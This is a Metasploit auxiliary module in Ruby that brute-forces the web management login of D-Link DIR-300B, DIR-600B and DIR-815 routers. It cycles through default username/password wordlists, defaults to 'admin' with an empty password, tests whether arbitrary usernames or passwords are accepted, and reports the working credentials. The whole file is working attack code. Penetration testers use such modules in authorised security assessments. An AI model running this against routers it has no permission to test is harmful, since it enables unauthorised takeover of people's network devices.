##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##


require 'msf/core'
require 'rex/proto/ntlm/message'


class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::Report
	include Msf::Auxiliary::AuthBrute

	include Msf::Auxiliary::Scanner

	def initialize
		super(
			'Name'           => 'DLink DIR 300B / DIR 600B / DIR 815 HTTP Login Utility',
			'Description'    => 'This module attempts to authenticate to different DLink HTTP management services.',
			'Author'         => [
					'hdm',	#http_login module
					'Michael Messner <devnull@s3cur1ty.de>'	#dlink login included
				],
			'References'     =>
				[
					[ 'CVE', '1999-0502'] # Weak password
				],
			'License'        => MSF_LICENSE
		)

		register_options(
			[
				OptPath.new('USERPASS_FILE',  [ false, "File containing users and passwords separated by space, one pair per line",
					File.join(Msf::Config.install_root, "data", "wordlists", "http_default_userpass.txt") ]),
				OptPath.new('USER_FILE',  [ false, "File containing users, one per line",
					File.join(Msf::Config.install_root, "data", "wordlists", "http_default_users.txt") ]),
				OptPath.new('PASS_FILE',  [ false, "File containing passwords, one per line",
					File.join(Msf::Config.install_root, "data", "wordlists", "http_default_pass.txt") ]),
			], self.class)
	end

	def target_url
		proto = "http"
		if rport == 443 or ssl
			proto = "https"
		end
		"#{proto}://#{rhost}:#{rport}#{@uri.to_s}"
	end

	def run_host(ip)

		@uri = "/session.cgi"

		print_status("Attempting to login to #{target_url}")

		each_user_pass { |user, pass|
			do_login(user, pass)
		}
	end

	#default to user=admin without password (default on most dlink routers)
	def do_login(user='admin', pass='')
		vprint_status("#{target_url} - Trying username:'#{user}' with password:'#{pass}'")

		response  = do_http_login(user,pass)
		result = determine_result(response)

		if result == :success
			print_good("#{target_url} - Successful login '#{user}' : '#{pass}'")

			any_user = false
			any_pass = false

			vprint_status("#{target_url} - Trying random username with password:'#{pass}'")
			any_user  =  determine_result(do_http_login(Rex::Text.rand_text_alpha(8), pass))

			vprint_status("#{target_url} - Trying username:'#{user}' with random password")
			any_pass  = determine_result(do_http_login(user, Rex::Text.rand_text_alpha(8)))

			if any_user == :success
				user = "anyuser"
				print_status("#{target_url} - Any username with password '#{pass}' is allowed")
			else
				print_status("#{target_url} - Random usernames are not allowed.")
			end

			if any_pass == :success
				pass = "anypass"
				print_status("#{target_url} - Any password with username '#{user}' is allowed")
			else
				print_status("#{target_url} - Random passwords are not allowed.")
			end

			report_auth_info(
				:host   => rhost,
				:port   => rport,
				:sname => (ssl ? 'https' : 'http'),
				:user   => user,
				:pass   => pass,
				:proof  => "WEBAPP=\"Generic\", PROOF=#{response.to_s}",
				:active => true
			)

			return :abort if ([any_user,any_pass].include? :success)
			return :next_user
		else
			vprint_error("#{target_url} - Failed to login as '#{user}'")
			return
		end
	end

	def do_http_login(user,pass)
		begin
			response = send_request_cgi({
				'uri' => @uri,
				'method' => 'POST',
				'vars_post' => {
					"REPORT_METHOD" => "xml",
					"ACTION" => "login_plaintext",
					"USER" => user,
					"PASSWD" => pass,
					"CAPTCHA" => ""
				}
			})
			return response
		rescue ::Rex::ConnectionError
			vprint_error("#{target_url} - Failed to connect to the web server")
			return nil
		end
	end

	def determine_result(response)
		return :abort unless response.kind_of? Rex::Proto::Http::Response
		return :abort unless response.code
		if response.body =~ /\<RESULT\>SUCCESS\<\/RESULT\>/
			return :success
		end
		return :fail
	end

end
